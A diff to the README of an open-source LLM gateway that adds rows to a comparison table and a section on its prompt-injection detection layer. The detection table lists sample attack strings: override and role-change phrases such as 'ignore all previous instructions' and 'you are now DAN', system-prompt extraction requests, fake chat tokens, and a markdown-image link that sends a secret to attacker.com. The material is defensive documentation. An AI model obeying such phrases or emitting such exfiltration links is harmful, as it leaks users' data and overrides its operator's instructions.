@@ -41,9 +41,14 @@ Apps talk OpenAI- or Anthropic-shaped JSON to one URL. The gateway picks the rig
 | | Adaptive LLM Gateway | LiteLLM | Portkey | OneAPI | OpenRouter |
 |---|---|---|---|---|---|
 | Open source | ✓ Apache 2.0 | ✓ MIT | ✓ MIT | ✓ MIT | (commercial) |
-| OpenAI-compatible endpoint | ✓ | ✓ | ✓ | ✓ | ✓ |
-| Anthropic-compatible endpoint | ✓ | ✓ | partial | – | ✓ |
+| OpenAI `/v1/chat/completions` | ✓ | ✓ | ✓ | ✓ | ✓ |
+| Anthropic `/v1/messages` | ✓ | ✓ | partial | – | ✓ |
+| OpenAI `/v1/embeddings` | ✓ | ✓ | ✓ | ✓ | – |
+| **Server-Sent Events streaming** | ✓ | ✓ | ✓ | ✓ | ✓ |
+| **Tool / function calling pass-through** | ✓ | ✓ | ✓ | partial | ✓ |
 | **Wraps CLI subscriptions as bridges** | **✓ (8 CLIs)** | – | – | – | – |
+| **Built-in prompt-injection defense** | **✓ (OWASP LLM-01)** | – | partial (guardrails) | – | – |
+| **Semantic cache (embedding similarity)** | **✓ (in-mem, Ollama)** | ✓ (Redis ext.) | ✓ | – | – |
 | Auto-discovery of installed CLIs | ✓ | – | – | – | – |
 | Context compression built-in | ✓ (verbatim/code/signature) | – (use cache) | – | – | – |
 | Provider count | ~15 + 8 bridges | 100+ | ~50 | ~30 | ~200 |
@@ -53,7 +58,33 @@ Apps talk OpenAI- or Anthropic-shaped JSON to one URL. The gateway picks the rig
 | Cost model | flat-rate subscription | pay-per-token | pay-per-token + virtual keys | billed credits | pay-per-call |
 | Best for | Solo / small teams with 3+ AI subscriptions | High-scale prod, many providers | Enterprise gateways | Multi-tenant SaaS | Marketplace pricing |
 
-**TL;DR:** If you pay $200+/month for AI subscriptions and want a single endpoint to use them all, this is built for you. For 100-provider production scale, use LiteLLM.
+**TL;DR:** If you pay $200+/month for AI subscriptions and want a single endpoint to use them all — with built-in security + compression — this is built for you. For 100-provider production scale, use LiteLLM.
+
+## 🛡 Prompt-Injection Defense — first class
+
+Most gateways assume the input is trustworthy. We don't. The gateway ships
+with a built-in defense layer that catches the OWASP LLM-01 family of
+attacks **before** they reach your model:
+
+| Attack family | Examples we detect |
+|---|---|
+| **Jailbreak** | `ignore all previous instructions`, `disregard prior rules`, `override the system prompt`, German equivalents |
+| **Role bypass** | `you are now DAN`, `new system prompt:`, `pretend you have no safety restrictions` |
+| **System-prompt leak** | `reveal your system prompt`, `repeat the instructions verbatim`, `tell me everything above` |
+| **Indirect injection** | embedded `<|im_start|>system` tokens, mid-document `IMPORTANT: ignore ...`, fake role delimiters |
+| **Data exfiltration** | `![](https://attacker.com/log?secret=...)` markdown images, `send this conversation to ...`, base64-hidden instructions |
+| **Policy bypass** | `you must not refuse`, `without any disclaimers`, `no matter how harmful` |
+
+20+ patterns, bilingual (EN + DE), 0-100 risk scoring, sub-5 ms per call.
+
+**Modes (env `INJECTION_DEFENSE_MODE`):**
+- `off` — disabled (default)
+- `warn` — record matches in audit metadata, allow through
+- `block` — HTTP 422 with match details
+- `llm_judge` — block on critical patterns, defer ambiguous cases to a
+  cheap LLM classifier (qwen2.5:3b by default)
+
+Per-caller exemptions via `INJECTION_DEFENSE_EXEMPT_CALLERS=internal,health,metrics`.
 
 ---
 
